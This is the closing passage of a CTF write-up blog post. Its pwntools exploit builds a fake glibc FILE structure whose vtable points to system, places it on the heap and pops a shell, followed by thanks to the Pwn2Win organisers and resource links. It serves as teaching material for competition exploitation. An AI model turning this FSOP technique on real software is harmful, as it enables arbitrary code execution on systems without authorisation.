</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>((binsh</span><span style=color:#f29668>-</span><span style=color:#f29718>100</span><span>)</span><span style=color:#f29668>/</span><span style=color:#f29718>2</span><span>)     </span><span style=font-style:italic;color:#5c6773>#IO_buf_end
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>4
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'_IO_2_1_stderr_'</span><span>])
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>3</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>2
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x12e0</span><span>) 
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xffffffffffffffff</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x12f0</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>3</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x00000000ffffffff</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xffffffffffffffff</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(fake_vtable)
</span><span>    fake_file_str </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(system)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Add the fake file structure
</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>123</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'f'</span><span style=color:#f29668>*</span><span style=color:#f29718>8 </span><span style=color:#f29668>+ </span><span>fake_file_str)
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>    </span><span style=color:#ffb454>ret</span><span>()
</span><span>    </span><span style=color:#ffb454>send_commands</span><span>(</span><span style=color:#f29718>1233</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
</span><span>
</span></code></pre><p>Boom , get shell!!<h2 id=conclusion>CONCLUSION</h2><p>I would like to thank the challenge author <a href=https://twitter.com/n0ps13d>n0ps13d</a> for creating such a beautiful challenge. Shout out to team <a href=https://twitter.com/Pwn2Win>Pwn2Win</a> for conducting the CTF.<h2 id=resources>Resources</h2><ol><li><a href=https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/>Dhaval Kapil's Blog</a><li><a href=https://github.com/vigneshsrao/File-xploit/blob/master/FilePointer.py>File Exploit offsets By sherlock_</a></ol><p>Here' the <a href=https://gist.github.com/PwnVerse/fd225be6ec55144e9b32169ffbe9bc9a>link</a> to final exploit</section></article></main></div>